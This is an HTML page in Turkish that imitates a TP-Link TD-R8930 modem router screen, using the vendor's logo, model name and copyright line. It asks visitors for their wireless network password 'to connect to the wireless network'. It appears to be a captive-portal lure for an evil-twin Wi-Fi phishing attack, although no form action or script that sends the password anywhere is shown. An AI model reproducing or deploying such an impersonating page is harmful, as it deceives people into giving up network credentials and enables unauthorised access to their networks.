<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <title>Ağ Bağlantısı</title>
</head>
<body>
    
    <!-- Header Başlangıç -->
    <div style="height: 90px; background: #09C url(top_bg.jpg) repeat-x;">
        <a href="http://www.tp-link.com">
            <img id="logo" src="top1.jpg" style="float: left;" border="0">
        </a>
        <div id="mod" style="height: 87px; margin: 0; text-align: right; overflow: hidden; background: url(top1_2.jpg) no-repeat right;">
        <p id="mname" style="font-size: 16px; font-weight: bold; color: #fff; margin: 37px 24px 0 0; padding: 0;">300Mbps Wireless N Gigabit VDSL2 Modem Router</p>
        <p id="mnum" style="font-size: 12px; font-weight: bold; color: #fff; margin: 2px 24px 0 0; padding: 0;">Model No. TD-R8930</p>
        </div>

        <img id="bhr" src="top2.jpg" style="height: 3px; width: 100%; display: block;">
    </div>
    <!-- Header Bitiş -->

    <!-- Form Başlangıç -->
    <div class="loginBox">
        <div class="noteDiv">
            <span id="note"></span>
            <span id="tip"></span>
        </div>
        <div class="panelThre" align="center">
            <div class="picDiv">
                <ul>
                    <label id="warn" style="font-family: Verdana; -webkit-text-size-adjust: none; display: inline-block; font-size: 12px; margin-bottom: 10px;">Kablosuz ağa bağlanabilmek için lütfen ağ şifresini giriniz.</label>
                    <!--<li id="unLi" class="unLi" style="background: url(idunselect.png)">
                    <input class="text" id="userName" type="input" maxlength="15" autocomplete="off">
                    </li>-->
                    <li class="blank"></li>
                    <li id="pwLi" class="pwLi">
                        <input class="text" id="pcPassword" type="text" maxlength="25" autocomplete="off" required>
                    </li>
                </ul>
                <label id="loginBtn" class="loginBtn"></label>
                <div> <label id="copyright">Copyright © 2022 By TP-Link Corporation Limited. All rights reserved. </label></div>

            </div>
        </div>
    </div>


</body>
</html>
